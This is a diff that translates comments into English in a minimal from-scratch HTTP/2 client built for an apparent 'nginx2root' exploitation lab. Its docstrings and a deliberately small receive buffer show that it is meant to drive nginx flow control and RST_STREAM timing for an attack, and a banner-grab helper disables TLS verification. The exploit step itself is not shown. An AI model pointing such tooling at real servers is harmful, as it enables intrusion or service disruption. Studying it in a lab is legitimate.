@@ -1,15 +1,15 @@
-"""Cliente HTTP/2 minimo, escrito do zero para o laboratorio nginx2root.
+"""Minimal HTTP/2 client, written from scratch for the nginx2root lab.
 
-Nao usa nenhuma biblioteca HTTP/2 de terceiros (nem `h2`, nem `hpack`).
-Implementa apenas o subconjunto de RFC 9113 / RFC 7541 necessario para
-dirigir o controle de fluxo do servidor:
+Uses no third-party HTTP/2 library (neither `h2` nor `hpack`).
+Implements only the subset of RFC 9113 / RFC 7541 needed to drive the
+server's flow control:
 
-  * preface do cliente e SETTINGS
-  * HEADERS com um codificador HPACK minimo (literal sem indexacao,
-    sem Huffman, sem tabela dinamica)
+  * client preface and SETTINGS
+  * HEADERS with a minimal HPACK encoder (literal without indexing,
+    no Huffman, no dynamic table)
   * DATA, PING, RST_STREAM, WINDOW_UPDATE, GOAWAY
 
-O objetivo didatico e deixar visivel, byte a byte, o que o ataque envia.
+The educational goal is to make visible, byte by byte, what the attack sends.
 """
 
 from __future__ import annotations
@@ -20,7 +20,7 @@ import struct
 
 CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 
-# Tipos de frame (RFC 9113, secao 6)
+# Frame types (RFC 9113, section 6)
 DATA = 0x00
 HEADERS = 0x01
 PRIORITY = 0x02
@@ -37,11 +37,11 @@ FLAG_END_STREAM = 0x01
 FLAG_ACK = 0x01
 FLAG_END_HEADERS = 0x04
 
-# Limites de controle de fluxo (RFC 9113, secao 6.9.1)
+# Flow-control limits (RFC 9113, section 6.9.1)
 MAX_WINDOW = (1 << 31) - 1          # 2147483647
 DEFAULT_WINDOW = 65535
 
-# Codigos de erro (RFC 9113, secao 7)
+# Error codes (RFC 9113, section 7)
 CANCEL = 0x08
 
 
@@ -54,7 +54,7 @@ def frame_header(ftype: int, flags: int, stream_id: int, length: int) -> bytes:
 
 
 def _hpack_int(prefix_bits: int, value: int) -> bytes:
-    """Codifica um inteiro com prefixo N (RFC 7541, secao 5.1)."""
+    """Encode an integer with an N-bit prefix (RFC 7541, section 5.1)."""
     limit = (1 << prefix_bits) - 1
     if value < limit:
         return bytes((value,))
@@ -69,7 +69,7 @@ def _hpack_int(prefix_bits: int, value: int) -> bytes:
 
 
 def _hpack_str(value: str | bytes) -> bytes:
-    """String literal do HPACK: tamanho + bytes crus (sem Huffman)."""
+    """HPACK string literal: length + raw bytes (no Huffman)."""
     if isinstance(value, str):
         value = value.encode()
     return _hpack_int(7, len(value)) + value
@@ -83,7 +83,7 @@ def hpack_literal(name_index: int, value: str | bytes) -> bytes:
     return _hpack_int(4, name_index) + _hpack_str(value)
 
 
-# Indices da tabela estatica (RFC 7541, Apendice A)
+# Static table indices (RFC 7541, Appendix A)
 IDX_AUTHORITY = 1
 IDX_METHOD_GET = 2
 IDX_METHOD_POST = 3
@@ -93,7 +93,7 @@ IDX_SCHEME_HTTPS = 7
 
 
 def encode_request(host: str, path: str, method: str = "GET") -> bytes:
-    """Monta um bloco HPACK para uma requisicao simples."""
+    """Build an HPACK block for a simple request."""
     block = bytearray()
 
     if method == "GET":
@@ -117,7 +117,7 @@ def encode_request(host: str, path: str, method: str = "GET") -> bytes:
 
 
 class H2Connection:
-    """Conexao HTTP/2 sobre TLS com ALPN `h2`."""
+    """HTTP/2 connection over TLS with ALPN `h2`."""
 
     def __init__(self, host: str, port: int, rcvbuf: int = 4096,
                  timeout: float = 10.0):
@@ -128,8 +128,8 @@ class H2Connection:
 
         raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if rcvbuf:
-            # Buffer pequeno de proposito: queremos frames presos na fila
-            # de saida do nginx no momento do RST_STREAM.
+            # Deliberately small buffer: we want frames stuck in nginx's
+            # output queue at the moment of RST_STREAM.
             raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
         raw.settimeout(timeout)
         raw.connect((host, port))
@@ -141,7 +141,7 @@ class H2Connection:
         self.tx = 0
         self.rx = 0
 
-    # -- transporte ---------------------------------------------------
+    # -- transport ---------------------------------------------------
     def send(self, data: bytes) -> None:
         self.sock.sendall(data)
         self.tx += len(data)
@@ -185,7 +185,7 @@ class H2Connection:
         self.frame(SETTINGS, FLAG_ACK, 0)
 
     def window_update(self, stream_id: int, increment: int) -> None:
-        # O campo tem 31 bits; o valor enviado e' sempre mascarado.
+        # The field is 31 bits wide; the value sent is always masked.
         self.frame(WINDOW_UPDATE, 0, stream_id,
                    struct.pack("!I", increment & 0x7FFFFFFF))
 
@@ -208,9 +208,9 @@ class H2Connection:
     def goaway(self, code: int = 0, last_stream_id: int = 0) -> None:
         self.frame(GOAWAY, 0, 0, struct.pack("!II", last_stream_id, code))
 
-    # -- utilidades ---------------------------------------------------
+    # -- utilities ---------------------------------------------------
     def read_until_closed(self, seconds: float) -> tuple[int, bool]:
-        """Drena a conexao por ate `seconds`; devolve (bytes, morreu)."""
+        """Drain the connection for up to `seconds`; returns (bytes, died)."""
         import time
 
         self.sock.settimeout(0.5)
@@ -238,11 +238,11 @@ class H2Connection:
 
 
 def http1_server_header(host: str, port: int, timeout: float = 5.0) -> str | None:
-    """Faz um GET HTTP/1.0 e devolve o cabecalho `Server` (banner)."""
+    """Send an HTTP/1.0 GET and return the `Server` header (banner)."""
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    # Sem ALPN: o nginx negocia HTTP/1.1 normalmente.
+    # No ALPN: nginx negotiates HTTP/1.1 as usual.
     raw = socket.create_connection((host, port), timeout=timeout)
     try:
         with ctx.wrap_socket(raw, server_hostname=host) as tls:
